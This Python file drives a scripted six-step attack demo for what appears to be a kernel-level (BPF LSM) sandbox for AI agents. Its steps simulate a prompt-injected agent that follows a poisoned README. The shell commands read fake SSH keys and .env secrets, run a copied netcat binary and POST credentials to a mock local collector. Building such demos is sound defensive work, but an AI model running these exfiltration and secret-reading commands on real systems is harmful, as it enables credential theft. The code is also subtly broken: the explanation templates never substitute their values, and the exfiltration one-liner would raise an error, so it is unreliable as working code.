#!/usr/bin/env python3
"""
attacker/attack_steps.py

The deterministic 6-step attack sequence.
Each step runs a real shell command as the 'attacker' user inside the cgroup.
Returns a list of AttackStep results which are then streamed to the UI.
"""

import os
import subprocess
import time
import pwd
import stat
from dataclasses import dataclass, field, asdict
from typing import Optional
import ctypes

ATTACKER_USER = "attacker"
WORKSPACE = "/home/demo/workspace"
SECRETS_DIR = "/home/demo/secrets"
COLLECTOR_URL = "http://127.0.0.1:9999/collect"
CGROUP_PATH_FILE = "/opt/agentsentry/attacker_cgroup_path.txt"


@dataclass
class StepResult:
    step_num: int
    name: str
    description: str
    command: str
    exit_code: Optional[int]
    stdout: str
    stderr: str
    timestamp: float
    verdict: str  # "SUCCEEDED" | "BLOCKED_KERNEL" | "BLOCKED_PERMISSION" | "ERROR"
    kernel_event: str
    explanation: str

    def to_dict(self):
        return asdict(self)


def _get_cgroup_path() -> Optional[str]:
    try:
        with open(CGROUP_PATH_FILE) as f:
            return f.read().strip()
    except Exception:
        return None


def _move_to_cgroup(cgroup_path: str, pid: int):
    """Move pid to the attacker cgroup."""
    try:
        procs_file = os.path.join(cgroup_path, "cgroup.procs")
        with open(procs_file, "w") as f:
            f.write(str(pid))
    except Exception as e:
        print(f"[attack] WARNING: could not move {pid} to cgroup: {e}")


def _run_as_attacker(cmd: str, cgroup_path: Optional[str] = None,
                     timeout: int = 10) -> tuple[int, str, str]:
    """
    Run cmd as user 'attacker' in the attacker cgroup.
    Returns (exit_code, stdout, stderr).
    """
    try:
        pw = pwd.getpwnam(ATTACKER_USER)
        uid = pw.pw_uid
        gid = pw.pw_gid
        home = pw.pw_dir
    except KeyError:
        return -1, "", f"User '{ATTACKER_USER}' does not exist. Run 00_prereqs.sh first."

    env = {
        "HOME": home,
        "USER": ATTACKER_USER,
        "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "SHELL": "/bin/bash",
    }

    def preexec():
        # Drop privileges to attacker user
        os.setgid(gid)
        os.setuid(uid)

    try:
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            preexec_fn=preexec,
            env=env,
            executable="/bin/bash",
        )

        # Move to attacker cgroup immediately after fork
        if cgroup_path:
            _move_to_cgroup(cgroup_path, proc.pid)

        try:
            stdout, stderr = proc.communicate(timeout=timeout)
            return proc.returncode, stdout.decode("utf-8", errors="replace"), \
                   stderr.decode("utf-8", errors="replace")
        except subprocess.TimeoutExpired:
            proc.kill()
            stdout, stderr = proc.communicate()
            return -1, stdout.decode("utf-8", errors="replace"), \
                   "TIMEOUT: " + stderr.decode("utf-8", errors="replace")

    except Exception as e:
        return -1, "", f"Execution error: {e}"


def run_attack(progress_cb=None) -> list[StepResult]:
    """
    Execute all 6 attack steps. progress_cb(StepResult) is called after each step.
    Returns list of all StepResult objects.
    """
    cgroup_path = _get_cgroup_path()
    results = []

    def step(num, name, desc, cmd, kernel_event, explanation_template):
        ts = time.time()
        print(f"[attack] Step {num}: {name}")
        print(f"[attack] CMD: {cmd}")

        rc, out, err = _run_as_attacker(cmd, cgroup_path)

        # Determine verdict
        if rc == 0:
            verdict = "SUCCEEDED"
            expl = explanation_template.format(
                verdict="SUCCEEDED",
                reason="Gateway is OFF or this action is permitted."
            )
        elif rc == 1 and ("Permission denied" in err or "Operation not permitted" in err):
            verdict = "BLOCKED_KERNEL"
            expl = explanation_template.format(
                verdict="BLOCKED by kernel (BPF LSM – EPERM)",
                reason="BPF LSM hook returned -EPERM for this operation."
            )
        elif rc == 13 or "Permission denied" in err:
            verdict = "BLOCKED_KERNEL"
            expl = explanation_template.format(
                verdict="BLOCKED by kernel",
                reason="Kernel denied the operation."
            )
        else:
            verdict = "SUCCEEDED" if rc == 0 else "ERROR"
            expl = explanation_template.format(
                verdict=verdict,
                reason=f"Exit code {rc}."
            )

        # Classify output
        combined = out + err
        if "Operation not permitted" in combined or "EPERM" in combined:
            verdict = "BLOCKED_KERNEL"
        if "Permission denied" in combined and verdict != "SUCCEEDED":
            verdict = "BLOCKED_KERNEL"

        result = StepResult(
            step_num=num,
            name=name,
            description=desc,
            command=cmd,
            exit_code=rc,
            stdout=out[:2000],
            stderr=err[:2000],
            timestamp=ts,
            verdict=verdict,
            kernel_event=kernel_event,
            explanation=expl,
        )
        results.append(result)
        if progress_cb:
            progress_cb(result)
        time.sleep(0.5)  # small pause so UI can display each step clearly
        return result

    # ── Step 1: Benign workspace enumeration ──────────────────────────────
    step(
        1, "Workspace Enumeration",
        "List files in the workspace and read config (benign, should succeed).",
        f"ls -la {WORKSPACE} && cat {WORKSPACE}/config.json",
        "file_open (allowed)",
        "The attacker listed workspace files and read config.json. "
        "Result: {{verdict}}. {{reason}} "
        "BPF hook: bpf_lsm_file_open – path is inside /home/demo/workspace so policy allows it.",
    )

    # ── Step 2: Read the poisoned README ─────────────────────────────────
    step(
        2, "Read Poisoned README",
        "Read the README.md which contains instructions to steal secrets.",
        f"cat {WORKSPACE}/README.md",
        "file_open (allowed – still in workspace)",
        "The attacker read the poisoned README.md which instructed it to steal secrets. "
        "Result: {{verdict}}. {{reason}} "
        "bpf_lsm_file_open fires but path is /home/demo/workspace/README.md – inside allowed zone.",
    )

    # ── Step 3: Steal fake secrets ────────────────────────────────────────
    step(
        3, "Steal Fake SSH Key",
        "Attempt to read /home/demo/secrets/fake_id_rsa (outside workspace).",
        f"cat {SECRETS_DIR}/fake_id_rsa",
        "file_open → bpf_lsm_file_open → DENY",
        "The attacker tried to read a fake SSH key at /home/demo/secrets/fake_id_rsa. "
        "Result: {{verdict}}. {{reason}} "
        "bpf_lsm_file_open checks path prefix; /home/demo/secrets matches deny rule.",
    )

    step(
        3, "Steal Fake .env File",
        "Attempt to read /home/demo/secrets/fake.env (outside workspace).",
        f"cat {SECRETS_DIR}/fake.env",
        "file_open → bpf_lsm_file_open → DENY",
        "The attacker tried to read a fake .env credentials file. "
        "Result: {{verdict}}. {{reason}} "
        "bpf_lsm_file_open: path /home/demo/secrets/fake.env matches deny prefix.",
    )

    # ── Step 4: Create file outside workspace ─────────────────────────────
    step(
        4, "Create Exfil File",
        "Attempt to create /tmp/outside/pwned.txt (outside workspace).",
        "mkdir -p /tmp/outside && echo 'PWNED – fake data exfiltrated' > /tmp/outside/pwned.txt",
        "inode_create → bpf_lsm_inode_create → DENY",
        "The attacker tried to write a file to /tmp/outside/pwned.txt, outside the workspace. "
        "Result: {{verdict}}. {{reason}} "
        "bpf_lsm_inode_create fires; parent dir /tmp/outside is not under /home/demo/workspace.",
    )

    # ── Step 5: Execute a blocked binary ─────────────────────────────────
    # Copy curl/nc to a temp path and try to execute it
    step(
        5, "Execute Blocked Binary",
        "Copy nc to /tmp/attacker_nc and attempt to run it (not in allow list).",
        "cp /usr/bin/nc /tmp/attacker_nc 2>/dev/null || cp /bin/nc.openbsd /tmp/attacker_nc 2>/dev/null; "
        "/tmp/attacker_nc -z 127.0.0.1 80 2>&1 || echo 'nc blocked'",
        "bprm_check_security → bpf_lsm_bprm_check_security → DENY",
        "The attacker copied nc (netcat) to /tmp/attacker_nc and tried to execute it. "
        "Result: {{verdict}}. {{reason}} "
        "bpf_lsm_bprm_check_security fires; /tmp/attacker_nc is not in the binary allow list.",
    )

    # ── Step 6: Exfiltrate to mock collector ─────────────────────────────
    step(
        6, "Exfiltrate to Collector",
        f"POST fake credentials to mock collector at {COLLECTOR_URL}.",
        f"python3 -c \""
        "import urllib.request, json; "
        "data = json.dumps({{'secret': 'FAKE_ID_RSA_CONTENT', 'env': 'FAKE_ENV_CONTENT'}}).encode(); "
        f"req = urllib.request.Request('{COLLECTOR_URL}', data=data, "
        "headers={{'Content-Type': 'application/json'}}); "
        "urllib.request.urlopen(req, timeout=3)\"",
        "socket_connect → bpf_lsm_socket_connect → DENY",
        "The attacker tried to POST fake credentials to the mock collector (127.0.0.1:9999). "
        "Result: {{verdict}}. {{reason}} "
        "bpf_lsm_socket_connect fires; all outbound connections are blocked for the attacker cgroup.",
    )

    return results
